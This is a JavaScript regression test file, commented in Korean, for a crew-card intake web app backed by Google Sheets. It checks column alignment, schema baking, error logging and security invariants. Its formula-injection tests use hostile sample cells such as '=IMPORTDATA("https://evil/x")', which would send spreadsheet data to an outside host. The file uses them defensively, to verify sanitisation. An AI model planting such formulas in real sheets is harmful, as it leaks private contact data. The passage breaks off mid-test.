// 크루카드 웹앱 회귀 — 별도 프로젝트(crewcard/)와 카드 HTML의 배선이 갈라지는 것을 기계로 막는다.
// 지키는 것: ①컬럼 정본 ↔ 베이크된 data-column 정합 ②서빙본=문서본 동일 ③보안 불변식(hp·상한·doGet 무부작용)
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

// SYNK_TEST_SRC_ROOT = 변이 실험용 이음매(궤적·면접궤적 테스트와 같은 규약). 평소엔 실소스를 본다.
// 탐지력은 「사본을 변이시키면 빨개지는가」로 재고, **실파일은 절대 안 건드린다**(F065·F067·code-edit-guard).
const ROOT = process.env.SYNK_TEST_SRC_ROOT || path.resolve(__dirname, '..');
const read = (p) => fs.readFileSync(path.join(ROOT, p), 'utf8');
/* 부정 단언(「~가 없어야 한다」)의 주어만 이걸로 감싼다 — 주석이 금지어를 «설명»하면 그 검사가
 * 설명을 위반으로 읽는다. 구간 앵커·긍정 단언은 원문 그대로 둔다. (대기열 #Q72) */
const { 코드만 } = require('./lib/소스검사.js');
/* 시트 흉내는 공용 하나다 — 계약·근거·변이 픽스처가 거기 산다(#Q85 · F460). */
const { 시트흉내 } = require('./lib/시트흉내.js');

const server = read('crewcard/크루카드.js');
const 상담 = read('crewcard/상담시트.js');
const htmlKr = read('crewcard/카드_kr.html');
const htmlMn = read('crewcard/카드_mn.html');
const schema = JSON.parse(read('docs/크루카드/크루카드_스키마.json'));

const COLUMNS = (() => {
  const m = server.match(/const COLUMNS = \[([\s\S]*?)\];/);
  assert.ok(m, '크루카드.js에서 COLUMNS 리터럴을 찾지 못했다');
  return m[1].match(/'([^']+)'/g).map((s) => s.slice(1, -1));
})();

// data-column 실값만 (스크립트 문자열 템플릿 오염 방지 — [a-z0-9_]만 허용)
const htmlColumns = (html) =>
  new Set([...html.matchAll(/data-column="([a-z0-9_]+)"/g)].map((x) => x[1]));

test('COLUMNS 정본 — 크기·중복·머리 3열·Serial 열 위치', () => {
  // [2026-08-04] 182 → 184: 마케팅 어트리뷰션 source·referrer / 184 → 185: field_interest_undecided
  assert.equal(COLUMNS.length, 185, 'COLUMNS가 185열이 아니다 — 스키마와 같이 바꿨는지 확인');
  /* 🔑 지키는 것은 「무엇이 맨 뒤인가」가 아니라 **「기존 열의 자리가 안 밀렸는가」**다.
   *   라이브 crew_cards 헤더는 이름이 아니라 위치로 붙으므로 중간 삽입은 그 뒤 전부를 한 칸씩 민다.
   *   그래서 새 열은 언제나 append 이고, 검사는 옛 열의 **인덱스**를 못 박는다
   *   (「마지막 둘」로 못 박으면 다음 append 때 그 검사부터 깨져서 진짜 불변식이 흐려진다). */
  assert.equal(COLUMNS.indexOf('source'), 182, 'source 자리가 밀렸다 — 중간에 열을 끼웠다');
  assert.equal(COLUMNS.indexOf('referrer'), 183, 'referrer 자리가 밀렸다 — 중간에 열을 끼웠다');
  assert.equal(COLUMNS.indexOf('field_interest_undecided'), 184,
    '「아직 미정」 열이 맨 뒤가 아니다 — field_interest_* 무리 옆에 끼우면 그 뒤가 전부 밀린다');
  assert.equal(new Set(COLUMNS).size, COLUMNS.length, '중복 컬럼');
  assert.deepEqual(COLUMNS.slice(0, 3), ['submitted_at', 'ref_serial', 'lang']);
  // 크루_다음번호_가 B열(2번째)을 ref_serial로 읽는다 — 열 순서를 바꾸면 채번이 눈이 먼다
  assert.equal(COLUMNS[1], 'ref_serial', 'ref_serial이 B열이 아니면 크루_다음번호_의 getRange(2,2,…)도 같이 고쳐야 한다');
});

test('스키마 ↔ COLUMNS — 모든 단일 컬럼 포함 + multi는 옵션 수만큼 전개', () => {
  for (const sec of schema.sections) {
    for (const f of sec.fields) {
      if (f.type === 'multi' && f.column_prefix) {
        const got = COLUMNS.filter((c) => c.startsWith(f.column_prefix + '_')).length;
        assert.ok(got >= f.options.length, `${f.field_id}: 옵션 ${f.options.length}개인데 컬럼 ${got}개`);
      } else if (f.column) {
        assert.ok(COLUMNS.includes(f.column), `스키마 컬럼 누락: ${f.column}`);
      }
    }
  }
});

test('베이크된 HTML ↔ COLUMNS — 양방향 정합 (KR·MN 동일)', () => {
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    const hc = htmlColumns(html);
    const strays = [...hc].filter((c) => !COLUMNS.includes(c));
    assert.deepEqual(strays, [], `[${name}] HTML에만 있는 유령 컬럼`);
    const meta = new Set(['submitted_at', 'ref_serial', 'lang']);
    const missing = COLUMNS.filter((c) => !hc.has(c) && !meta.has(c));
    assert.deepEqual(missing, [], `[${name}] HTML에 바인딩이 없는 컬럼 — 제출해도 이 값은 영영 빈칸`);
    // 바인딩은 정적 베이크가 정본 — 런타임 라벨 매칭(몽골어에서 전멸)에 의존하면 회귀
    assert.ok((html.match(/data-field="/g) || []).length >= 320, `[${name}] 베이크 소실`);
  }
});

test('서빙본(crewcard/) = 문서본(docs/크루카드/) 바이트 동일 — 두 벌이 갈라지면 여기서 죽는다', () => {
  assert.equal(htmlKr, read('docs/크루카드/크루카드_한국어.html'), 'KR 두 벌이 다르다 — 한쪽만 고쳤다');
  assert.equal(htmlMn, read('docs/크루카드/크루카드_몽골어.html'), 'MN 두 벌이 다르다 — 한쪽만 고쳤다');
});

test('🔑 2행에 **박힌** 스키마 = 정본 JSON — 런타임이 읽는 것은 파일이 아니라 이쪽이다', () => {
  /* 08-04 실측으로 발견한 조용한 드리프트: source·referrer 를 정본 JSON 에만 넣고 카드 2행의
   *   base64 를 안 구웠다. loadSchema 의 상대 경로(`data/…json`)는 **폴백일 뿐 실제로 안 탄다** —
   *   window.__resources.fieldSchema 가 먼저 이긴다. 그래서 정본을 고쳐도 라이브는 안 바뀐다.
   * 🔑 이건 「문서가 코드와 다르다」가 아니라 **「정본이라 부르는 파일이 실행에 안 쓰인다」**다.
   *   증상이 0이라 눈으로는 영원히 안 걸린다. 굽는 도구 = tools/크루카드_스키마굽기.js */
  // LF 정규화 양쪽 — autocrlf=true 체크아웃은 정본을 CRLF로 내려주는데 base64 속 사본은 LF 그대로라,
  // 내용이 같아도 줄끝만으로 적색이 된다(재는 층이 값을 깨뜨리는 계열 · 굽기 도구도 같은 정규화를 한다)
  const LF = (s) => s.replace(/\r\n/g, '\n');
  const 정본 = LF(read('docs/크루카드/크루카드_스키마.json'));
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    const m = /"fieldSchema":\s*"data:application\/json;base64,([A-Za-z0-9+/=]+)"/.exec(html);
    assert.ok(m, `[${name}] 2행 base64 스키마 앵커가 사라졌다`);
    assert.equal(LF(Buffer.from(m[1], 'base64').toString('utf8')), 정본,
      `[${name}] 박힌 스키마가 정본과 다르다 — \`node tools/크루카드_스키마굽기.js\` 로 굽고 커밋하라`);
  }
});

test('카드 HTML — 제출·자동저장·허니팟·퀴즈 배선', () => {
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    assert.ok(html.includes('id="synkHp"'), `[${name}] 허니팟 입력 없음`);
    assert.ok(html.includes("form:'crew_card'"), `[${name}] 제출 페이로드 form 식별자 없음`);
    assert.ok(html.includes('hp: (document.getElementById'), `[${name}] 허니팟이 페이로드에 안 실린다`);
    // 브라우저 기본값 의존을 없애는 명시화(08-04). ⚠ 이건 인코딩 버그의 수정이 아니다 —
    // 깨짐의 원인은 헤더가 아니라 Windows 셸의 CP949 인코딩이었고, 재실측으로 정정됐다.
    assert.ok(/'Content-Type':\s*'text\/plain;charset=UTF-8'/.test(html), `[${name}] 제출 fetch의 Content-Type 명시가 사라졌다`);
    assert.ok(!html.includes('크루카드_토큰') && !html.includes('SYNK_ENDPOINT.token'), `[${name}] 무토큰 결정 위반 — 클라이언트에 토큰 언급 잔재`);
    assert.ok(html.includes('quiz (.quiz-opts)'), `[${name}] 퀴즈 수집 패스 없음 — Q1~Q4가 시트에 안 간다`);
    // 동의는 .opts 밖(.agree)이라 기본 수집 패스가 못 본다 — 빠지면 동의 기록이 시트에 안 남는다(08-04 실측)
    assert.ok(html.includes(".querySelectorAll('.consent .agree')"), `[${name}] 동의 수집 패스 없음 — consent_privacy/media가 빈칸으로 남는다`);
    assert.ok(html.includes('quiz single-select'), `[${name}] 퀴즈 단일선택 배선 없음`);
    assert.ok(html.includes("'synk.crewcard.v14'"), `[${name}] 자동저장 키가 v14가 아니다`);
    assert.ok(html.includes('reg_year_month='), `[${name}] fYear 보정(등록일 합성) 소실`);
    assert.ok(/@media \(max-width:760px\)/.test(html), `[${name}] 모바일 반응형 소실 — 원격(구글폼 겸용) 입구가 죽는다`);
  }
});

test('카드 HTML — 모든 <script> 블록이 실제로 파싱된다', () => {
  /* 08-04 실사고: 주석 안에 스크립트 종료 태그를 문자로 썼더니 HTML 파서가 거기서 블록을 끊어
   * 제출·자동저장 스크립트 전체가 죽었다. 그런데 「문자열이 있는가」만 보던 기존 검사는 전부 초록이었다
   * — 문자열은 남아 있었기 때문이다. 가드는 조각이 아니라 **적용된 결과**(=파싱되는가)를 봐야 한다. */
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    const blocks = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1]);
    assert.ok(blocks.length >= 4, `[${name}] 스크립트 블록이 ${blocks.length}개 — 조기 종료로 잘렸을 수 있다`);
    blocks.forEach((code, i) => {
      assert.doesNotThrow(() => new Function(code), `[${name}] 스크립트 블록 ${i + 1}이 파싱되지 않는다 — 그 블록의 기능이 통째로 죽는다`);
    });
    // 제출 배선은 마지막 블록에 있다 — 그 블록이 끊기면 버튼이 아무 일도 안 한다
    const submit = blocks.find((b) => b.includes('SYNK_ENDPOINT'));
    assert.ok(submit, `[${name}] 제출 스크립트 블록을 찾지 못했다`);
    assert.ok(submit.includes('synkSubmitBtn') && submit.includes("addEventListener('click'"),
      `[${name}] 제출 블록이 잘려 클릭 핸들러까지 닿지 않는다`);
  }
});

/* ── Part 06 K-Culture 예약 서체 ─────────────────────────────────────────────
 * 2026-08-05 실사고: 이 서체들이 「정본은 3종만」을 근거로 **통째로 지워졌다가** 유호님
 * 판정으로 되살아났다("파트6는 특별한 페이지라 일부러 다른 폰트를 사용했다"). 지운 쪽이
 * 틀린 게 아니다 — 예약이 **파일 주석에만** 살아 있었고 정본에는 예외가 없었다.
 * 주석은 가드가 아니라서, 정본을 성실히 따를수록 지우게 되는 상태였다.
 *
 * 그래서 세 곳에 박는다: 정본 §4-1(사람) · 렌더 린트의 `.kc-page` 구역 경계(기계) · 여기.
 * 🔑 검사는 **양방향**이다 — 예약이 사라져도 잡고, 통로 밖으로 번져도 잡는다.
 *   한 방향만 보면 반대쪽으로 샌다: 「금지만」 검사하면 이번 삭제를 못 잡았고,
 *   「존재만」 검사하면 Fraunces 가 본문으로 번지는 걸 못 잡는다. */
const { KC_FONTS_OK } = require('../tools/브랜드렌더린트');
// 주석은 이력이라 검사 대상이 아니다 — 경위를 적은 주석이 자기 검사에 걸리면
// 다음 사람은 이력을 지워서 초록을 만든다(가드가 자기 처방을 막는 형태 · F103).
const 주석제거 = (s) => s.replace(/<!--[\s\S]*?-->/g, '').replace(/\/\*[\s\S]*?\*\//g, '');
const KC_예약 = { kr: ['Fraunces', 'Gowun Batang'], mn: ['Fraunces', 'Gowun Batang', 'Cormorant'] };

/** `--kc-*` 통로 **밖**에서 예약 서체를 직접 지정한 선언들. 통로 안이면 정상이다. */
const 통로밖사용 = (html) => {
  const bad = [];
  for (const decl of 주석제거(html).match(/(?:font-family|--[\w-]+)\s*:[^;}]+/g) || []) {
    if (/^\s*--kc-/.test(decl)) continue;
    for (const f of KC_FONTS_OK) if (decl.includes(f)) bad.push(f);
  }
  return bad;
};

test('Part 06 예약 서체가 살아 있다 — 08-05 에 한 번 통째로 지워졌다', () => {
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    const live = 주석제거(html);
    for (const v of ['--kc-serif', '--kc-serif-head']) {
      assert.ok(new RegExp(`${v}\\s*:`).test(live),
        `[${name}] ${v} 통로가 사라졌다 — Part 06 은 일부러 다른 서체를 쓰는 특별면이다(정본 §4-1)`);
    }
    for (const f of KC_예약[name]) {
      assert.ok(live.includes(`family=${f.replace(/ /g, '+')}`),
        `[${name}] 폰트 링크에서 ${f} 가 빠졌다 — 이름만 남고 로드가 없으면 조용히 폴백한다`);
    }
  }
});

test('예약 서체는 --kc-* 통로 밖에서 쓰이지 않는다 (예외가 저장소로 새지 않게)', () => {
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    assert.deepStrictEqual(통로밖사용(html), [],
      `[${name}] 예약 서체가 --kc-* 밖에서 직접 지정됐다 — 예외는 Part 06 구역 안에서만이다`);
  }
});

test('두 검사 자신의 탐지력 — 픽스처로 못박는다', () => {
  // 실저장소가 통과하는 동안에도 이 검사들이 죽지 않았음을 증명한다
  // (실저장소만 보면 「통과」와 「미실행」이 같은 모양이다).
  assert.deepStrictEqual(통로밖사용(".t{font-family:'Fraunces',serif}"), ['Fraunces'],
    '통로 밖 직접 지정을 못 잡는다');
  assert.deepStrictEqual(통로밖사용("  --kc-serif:'Fraunces','Gowun Batang',serif;"), [],
    '통로 안 선언을 위반으로 센다 — 거짓양성');
  assert.deepStrictEqual(통로밖사용('<!-- Fraunces 를 지웠다 -->'), [],
    '경위를 적은 주석을 위반으로 센다 — 거짓양성');
  // 「사라짐」 쪽 탐지력: 통로를 지운 사본이 실제로 물리는가
  assert.throws(
    () => assert.ok(/--kc-serif\s*:/.test(주석제거(htmlKr).replace(/--kc-serif/g, '--x'))),
    '통로가 사라진 사본을 통과시킨다 — 이번 사고를 다시 못 잡는다'
  );
});

test('서버 보안 불변식 — doGet 무부작용·hp 선차단·일일상한·락 채번', () => {
  const doGet = server.slice(server.indexOf('function doGet'), server.indexOf('function doPost'));
  const doGet코드 = 코드만(doGet); // 루프 밖에서 한 번만 정제한다(자리마다 감싸면 렉싱이 4배)
  for (const bad of ['appendRow', 'setProperty', 'insertSheet', 'deleteRow']) {
    assert.ok(!doGet코드.includes(bad), `doGet에 부작용(${bad}) — GET은 읽기 전용이어야 한다`);
  }
  const doPost = server.slice(server.indexOf('function doPost'), server.indexOf('function 크루_탭_'));
  const order = ['body.form', 'body.hp', 'DAILY_CAP', 'waitLock', 'appendRow', 'releaseLock'];
  let prev = -1;
  for (const mark of order) {
    const cur = doPost.indexOf(mark);
    assert.ok(cur > prev, `doPost 순서 붕괴: ${order.join(' → ')} 중 ${mark}`);
    prev = cur;
  }
  assert.ok(doPost.includes("error: 'internal'"), '내부 오류를 밖으로 흘리지 않는 응답이 사라졌다');
  assert.ok(server.includes('MAX_CELL'), '셀 길이 상한 소실');
});

/* ═══════════════════════════════════════════════════════════════════
 * doPost 오류 감시 [2026-08-05] — 조용한 실패 = 지원자 유실
 *   웹앱 오류는 트리거 실패 자동 메일 층 밖이라 호출자에게 'internal'로만 돌아갔다.
 *   처방 = 시트(crew_errors)에 적고, 알림은 감시되는 층(메인 crewIntakeWatch_)이 낸다.
 *   메일 금지(익명 POST=메일 폭탄)는 위의 기존 회귀가 파일 전체를 계속 잠근다.
 * ═══════════════════════════════════════════════════════════════════ */

test('doPost가 삼키는 두 실패(최상위·이관) 모두 crew_errors 기록을 지난다', () => {
  const doPost = server.slice(server.indexOf('function doPost'), server.indexOf('function 크루_탭_'));
  // 최상위 catch — 기록이 응답보다 먼저다(응답 뒤 코드는 실행되지 않는 죽은 배선이 된다)
  assert.match(doPost, /catch \(err\) \{[\s\S]*크루_오류로그_\('doPost', err\)[\s\S]*error: 'internal'/,
    '최상위 catch가 기록 없이(또는 응답 뒤에) 오류를 삼킨다 — 무감시로 회귀');
  // 이관 catch — 유실 경보는 「없어졌다」만 알지 「왜」를 모른다. 원인은 여기서만 잡힌다.
  assert.ok(doPost.includes("크루_오류로그_('이관:' + serial, 이관오류)"),
    '이관 실패가 기록을 안 지난다 — 유실 경보에 원인이 영영 안 붙는다');
});

test('🔑 이관 오류 기록은 락 **밖**이다 — 이관이 계통적으로 깨진 날 접수 처리량이 함께 죽는다', () => {
  /* 기록 1회 = 시트 왕복 2번(≈1초). 임계구역 안에서 하면 그만큼 락이 길어지고, 하필 이 경로는
   * 이관이 계통적으로 깨진 날 **매 제출마다** 밟힌다 → 뒤 제출의 waitLock(20000)이 타임아웃 나고
   * 그 타임아웃이 또 오류를 낳는 자기증폭 고리가 된다(적대 리뷰 M3). */
  const doPost = server.slice(server.indexOf('function doPost'), server.indexOf('function 크루_탭_'));
  const i해제 = doPost.indexOf('lock.releaseLock()');
  const i기록 = doPost.indexOf("크루_오류로그_('이관:'");
  assert.ok(i해제 !== -1 && i기록 !== -1, 'doPost 구조가 바뀌었다');
  assert.ok(i기록 > i해제, '이관 오류 기록이 releaseLock보다 앞이다 — 임계구역 안에서 시트를 왕복한다');
  // 최상위 catch의 기록은 finally가 이미 락을 푼 뒤라 문제없다(그쪽은 검사 대상 아님)
});

/* ═══════════════════════════════════════════════════════════════════
 * 🔴 [2026-08-15] 인계된 「실탄 왕복」 절차가 안 돈다 — 개명은 오류 주입이 **아니다**
 *
 *   10일째 ⏳유호로 걸려 있던 절차: 「crew_cards 탭 이름을 잠깐 바꿔 두고 → 제출 1회 →
 *   즉시 원복」. 그 절차는 감시가 «도는데도» 「안 돈다」로 읽히게 만든다 —
 *     ① 크루_탭_ 이 없는 탭을 **되만든다**(자기치유 [v9.163]) → doPost 는 throw 하지 않고
 *        crew_errors 는 한 줄도 안 생긴다. 체크리스트 ①~⑤가 전부 ✗ 로 보이는데 원인은
 *        「감시가 죽었다」가 아니라 «아무것도 주입되지 않았다»다(맹점 ④ — 맞는 얼굴로 틀린 값).
 *     ② 되만든 탭이 이름을 선점하므로 **원복이 이름 충돌로 막힌다**(시트 이름은 유일하다).
 *        원복하려면 방금 생긴 탭을 먼저 지워야 하는데, 그때는 이미 접수가 그 안에 있다.
 *     ③ 새 탭은 빈 탭이라 채번이 001 로 **되감긴다** → 기존 Serial 과 겹친다.
 *   자기치유 자체는 옳다 — 못박는 것은 「그래서 개명은 시험이 못 된다」다.
 *   대신 도는 절차 = crew_errors 에 시험행 1줄(읽는 쪽 반증) — memory/crewcard-error-watch.
 * ═══════════════════════════════════════════════════════════════════ */

/* 두 함수(크루_탭_·크루_다음번호_)를 실소스에서 떼어 실행한다.
 * ⚠ 흉내는 «캡처 전용»이다 — 쓴 값을 되읽지 않는다(safety.test.js 와 같은 계열).
 *   되읽는 흉내를 여기서 새로 지으면 공용 통로가 갈라진다(F460 · 시트흉내계약.test.js 가 막는다).
 *   읽기가 필요한 채번 검사는 공용 `시트흉내()` 를 그대로 쓴다. */
function 탭함수_(기록) {
  const src = server.match(/function 크루_탭_\(\)[\s\S]*?\n\}/)[0];
  const 번호src = server.match(/function 크루_다음번호_\(sh, today\)[\s\S]*?\n\}/)[0];
  return new Function(
    'SpreadsheetApp', 'CONSULT_SHEET_ID', 'CREW_TAB', 'COLUMNS',
    src + '\n' + 번호src + '\nreturn { 탭: 크루_탭_, 번호: 크루_다음번호_ };'
  )(
    {
      openById: () => ({
        getSheetByName: () => null,                 // 탭이 없다 = 사람이 이름을 바꿔 둔 상태
        insertSheet: () => { 기록.생성++; return 기록.새탭; }
      })
    },
    'FAKE', 'crew_cards', COLUMNS
  );
}

test('🔴 개명된 crew_cards 는 오류를 못 만든다 — 크루_탭_ 이 되만들어 접수가 그대로 성공한다', () => {
  const 기록 = { 생성: 0, 헤더: null, 얼림: 0, 넣은행: null };
  /* 새 탭의 기본 폭은 26열(Sheets 기본값)이라 185열 정본과 다르다 — 그 폭 확장까지 흉내 내야
   * 「되만든 탭에도 정상 append 된다」(=오류가 안 난다)를 정직하게 잴 수 있다. */
  기록.새탭 = {
    maxCols: 26,
    getMaxColumns() { return this.maxCols; },
    insertColumnsAfter(_after, n) { this.maxCols += n; return this; },
    getLastRow() { return 0; },                     // 갓 만든 탭 = 빈 탭
    setFrozenRows() { 기록.얼림++; },
    appendRow(r) {
      if (r.length > this.maxCols) throw new Error('열 폭 초과 — 실물 appendRow 가 여기서 터진다');
      기록.넣은행 = r;
    },
    getRange: () => ({
      setValues(v) { 기록.헤더 = v[0].slice(); return this; },   // 캡처만 — 되읽지 않는다
      setFontWeight() { return this; }
    })
  };
  const fns = 탭함수_(기록);
  const sh = fns.탭();

  assert.equal(기록.생성, 1, '탭이 없는데 안 만들었다 — 자기치유가 사라졌다([v9.163] 회귀)');
  assert.deepEqual(기록.헤더, COLUMNS, '되만든 탭에 헤더 정본이 안 깔렸다');
  assert.ok(sh.getMaxColumns() >= COLUMNS.length,
    `되만든 탭이 ${sh.getMaxColumns()}열 — 185열을 넣을 폭이 안 됐다`);
  // 🔑 이 한 줄이 절차 결함의 본체다: append 가 성립한다 = throw 가 없다 = crew_errors 가 안 생긴다
  assert.doesNotThrow(() => sh.appendRow(COLUMNS.map(() => '')),
    '되만든 탭에 append 가 터진다 — 그렇다면 개명이 오류 주입이 되지만, 실측은 성공이다');
  assert.equal(기록.넣은행.length, COLUMNS.length, '접수 행이 안 들어갔다');
});

test('🔴 되만든 탭은 채번을 001 로 되감는다 — 기존 Serial 과 겹친다', () => {
  const 오늘 = '20260815';
  const fns = 탭함수_({ 생성: 0 });
  // 첫행:1 = 헤더까지 담는 통짜 격자(시트흉내 계약의 두 관례 중 하나)
  const 산탭 = 시트흉내({ 첫행: 1, 행들: [COLUMNS, ['', 'SL-20260815-001'], ['', 'SL-20260815-002']] });
  assert.equal(fns.번호(산탭, 오늘), 3, '살아 있는 탭에서 다음 번호가 3이 아니다');

  const 되만든탭 = 시트흉내({ 첫행: 1, 행들: [COLUMNS] });   // 헤더만 있는 갓 만든 탭
  assert.equal(fns.번호(되만든탭, 오늘), 1,
    '되만든 빈 탭이 1부터 채번하지 않는다 — 이 검사의 전제가 바뀌었으면 절차 경고문부터 고쳐라');
});

function 오류로그하네스_(over) {
  const 저장 = { rows: [], props: {}, sh: null, 생성: 0, 헤더: null };
  // 시트 대역은 실제와 같은 「행이 쌓인다」 성질을 갖는다 — getLastRow를 상수로 두면
  // 헤더 치유 조건(M4)이 검사 밖으로 나간다(하네스가 관대해서 초록이 되는 계열).
  const fakeSheet = (초기행) => ({
    rows: 초기행 || [],
    getLastRow() { return this.rows.length; },
    getRange(r, c, nr, nc) {
      const self = this;
      return {
        setValues(v) { if (r === 1) { 저장.헤더 = v[0]; self.rows[0] = v[0]; } return this; },
        setFontWeight() { return this; },
      };
    },
    setFrozenRows: () => {},
    appendRow(r) { this.rows.push(r); 저장.rows.push(r); },
  });
  const SS = (over && over.SpreadsheetApp) || {
    openById: () => ({
      getSheetByName: () => 저장.sh,
      insertSheet: () => { 저장.생성++; 저장.sh = fakeSheet(); return 저장.sh; },
    }),
  };
  저장.시트놓기 = (초기행) => { 저장.sh = fakeSheet(초기행); return 저장.sh; };
  const src = server.match(/function 크루_오류로그_\(stage, err\)[\s\S]*?\n\}/)[0];
  const 셀안전src = server.match(/function 셀안전_\(v\)[\s\S]*?\n\}/)[0];
  const fn = new Function(
    'PropertiesService', 'SpreadsheetApp', 'Utilities', 'console', 'TZ_', 'CONSULT_SHEET_ID', 'ERR_TAB', 'ERR_DAILY_CAP',
    src + '\n' + 셀안전src + '\nreturn 크루_오류로그_;'
  )(
    { getScriptProperties: () => ({ getProperty: (k) => 저장.props[k], setProperty: (k, v) => { 저장.props[k] = v; } }) },
    SS,
    { formatDate: () => '20260805' },
    { error: () => {}, warn: () => {} },
    'Asia/Ulaanbaatar', 'FAKE', 'crew_errors', 50
  );
  return { fn, 저장 };
}

test('크루_오류로그_ — 실제로 적는다: 탭 생성·헤더 4열·개행 접기·수식 소독·길이 절단', () => {
  const { fn, 저장 } = 오류로그하네스_();
  fn('doPost', { stack: '=IMPORTDATA("https://evil")\n  at 크루_탭_ (크루카드:1)\t끝' });
  assert.equal(저장.생성, 1, '탭이 없으면 만들어야 한다 — 첫 오류가 기록처를 못 찾으면 안 된다');
  assert.deepEqual(저장.헤더, ['at', 'stage', 'detail', '통보'],
    '헤더가 4열이 아니다 — 스위프는 열을 번호로 읽으므로 「통보」 자리가 밀리면 전 행이 통보됨으로 읽힌다');
  assert.equal(저장.rows.length, 1);
  const [, stage, detail, 통보] = 저장.rows[0];
  assert.equal(stage, 'doPost');
  assert.equal(통보, '', '통보 칸은 비워 둬야 감시가 「새 사건」으로 읽는다');
  assert.ok(detail.startsWith("'="), '오류 문자열의 수식 접두가 소독을 안 지났다 — 오류 기록이 인젝션 통로가 된다');
  assert.ok(!/[\r\n\t]/.test(detail), '개행·탭이 살아 있다 — 경보 메일 본문 위조 재료가 된다');
  fn('x', { stack: 'A'.repeat(9999) });
  assert.ok(저장.rows[1][2].length <= 500, `detail이 ${저장.rows[1][2].length}자 — 상한 없이 시트가 오염된다`);
});

test('🔑 머리글 없는 crew_errors도 치유한다 — 1행에 착지하면 스위프가 영원히 못 본다', () => {
  /* 사람이 1행을 지웠거나 탭을 손으로 먼저 만들어 둔 경우, 헤더를 만들 때만 쓰면 오류가 1행에
   * 착지하고 읽는 쪽의 `getLastRow() >= 2` 가드에 걸려 **그 오류는 영원히 안 보인다**.
   * 같은 파일 크루_탭_이 [v9.163]에 이미 배운 함정이다(적대 리뷰 M4). */
  const { fn, 저장 } = 오류로그하네스_();
  저장.시트놓기([]);                       // 탭은 있는데 비어 있다(생성 경로를 안 탄다)
  fn('doPost', new Error('boom'));
  assert.deepEqual(저장.헤더, ['at', 'stage', 'detail', '통보'], '빈 탭에 헤더를 안 깔았다');
  assert.equal(저장.sh.getLastRow(), 2, `오류가 ${저장.sh.getLastRow()}행에 있다 — 2행이어야 스위프가 본다`);
});

test('🔴 상한 절단이 조용하지 않다 — 마지막 한 칸에 「여기서 잘렸다」를 남긴다', () => {
  /* 접수가 계통적으로 깨진 날 상한 50에 닿으면 나머지 250건이 흔적 없이 사라져 원장이
   * 규모를 5분의 1로 과소평가한다. 조용한 절단은 이 장치가 없애려던 바로 그 형태다(적대 리뷰 H4). */
  const { fn, 저장 } = 오류로그하네스_();
  저장.props['errlog:20260805'] = '49';     // 다음 기록이 마지막 칸(상한 50)
  fn('doPost', new Error('진짜 오류'));
  assert.equal(저장.rows.length, 1);
  assert.equal(저장.rows[0][1], '상한도달', '마지막 칸을 절단 표식으로 쓰지 않는다');
  assert.match(String(저장.rows[0][2]), /상한\(50건\)|이보다 많습니다/, '무엇이 잘렸는지가 본문에 없다');
  fn('doPost', new Error('그다음'));
  assert.equal(저장.rows.length, 1, '상한 뒤에도 계속 적는다');
});

test('크루_오류로그_ — 일일 상한: 오류 유발 반복 제출이 시트를 무한 증식시키지 못한다', () => {
  const { fn, 저장 } = 오류로그하네스_();
  저장.props['errlog:20260805'] = '50';
  fn('doPost', new Error('x'));
  assert.equal(저장.rows.length, 0, '상한을 넘겼는데 계속 적는다');
  // 상한 소모는 기록이 성립한 뒤에만 — 기록 실패가 상한만 태우면 진짜 오류가 밀려난다
  const 깨짐 = 오류로그하네스_({ SpreadsheetApp: { openById: () => { throw new Error('시트 다운'); } } });
  깨짐.fn('doPost', new Error('x'));
  assert.equal(깨짐.저장.props['errlog:20260805'], undefined, '기록이 실패했는데 상한을 소모했다');
});

test('🔒 크루_오류로그_는 절대 throw 하지 않는다 — 기록하려다 접수 응답까지 죽이면 역전이다', () => {
  const 깨짐 = 오류로그하네스_({ SpreadsheetApp: { openById: () => { throw new Error('시트 다운'); } } });
  assert.doesNotThrow(() => 깨짐.fn('doPost', new Error('원 오류')));
  const 널 = 오류로그하네스_();
  assert.doesNotThrow(() => 널.fn('이관:SL-1', undefined), 'err가 undefined여도 죽으면 안 된다');
  assert.equal(널.저장.rows.length, 1, 'undefined 오류도 기록 자체는 남아야 한다');
});

test('수식 인젝션 차단 — 셀안전_가 정본과 같고 실제로 막는다', () => {
  // 계기(08-04 적대 리뷰): 익명 POST 한 번으로 crew_cards에 라이브 수식이 착지하고, 같은
  // 스프레드시트의 상담 연락처가 IMPORTDATA로 빠져나갈 수 있었다. [v9.153] profiles와 같은 계열.
  const grab = (src) => {
    const m = src.match(/function 셀안전_\(v\)[\s\S]*?\n\}/);
    assert.ok(m, '셀안전_ 정의를 찾지 못했다');
    return m[0].replace(/\r\n/g, '\n');
  };
  const canon = grab(read('상담AI.js'));
  const local = grab(server);
  assert.equal(local, canon, 'crewcard 사본이 정본과 갈렸다 — 한쪽만 고치면 방어가 반쪽이 된다');

  // 문자열 존재가 아니라 동작으로 검사한다(가드는 「적용된 결과」를 본다)
  const body = local.slice(local.indexOf('{') + 1, local.lastIndexOf('}'));
  const 셀안전_ = new Function('v', body);
  ['=IMPORTDATA("https://evil/x")', '+1+1', '-1', '@SUM(A1)', '\tx', '\rx'].forEach((bad) => {
    assert.equal(셀안전_(bad), "'" + bad, `위험 접두를 못 막았다: ${JSON.stringify(bad)}`);
  });
  ['홍길동', 'Батбаяр', '010-1234-5678', '', 'a=b'].forEach((ok) => {
    assert.equal(셀안전_(ok), ok, `정상 값을 건드렸다: ${JSON.stringify(ok)}`);
  });
});

test('수식 인젝션 차단 — doPost의 시트 쓰기 경로가 전부 소독을 지난다', () => {
  const doPost = server.slice(server.indexOf('function doPost'), server.indexOf('function 크루_탭_'));
  assert.ok(doPost.includes('return 셀안전_(String(v).slice(0, MAX_CELL))'),
    '사용자 입력이 소독 없이 appendRow로 간다 — 익명 수식 인젝션 재개통');
  assert.ok(doPost.includes('return 셀안전_(String(body.lang'), 'lang(요청 본문)이 소독을 안 지난다');
  assert.ok(!/return String\(v\)\.slice/.test(코드만(doPost)), '소독 없는 원시 반환 경로가 남아 있다');
});

test('HtmlService 노출 표면 — 밑줄 없는 전역 함수는 doGet·doPost뿐', () => {
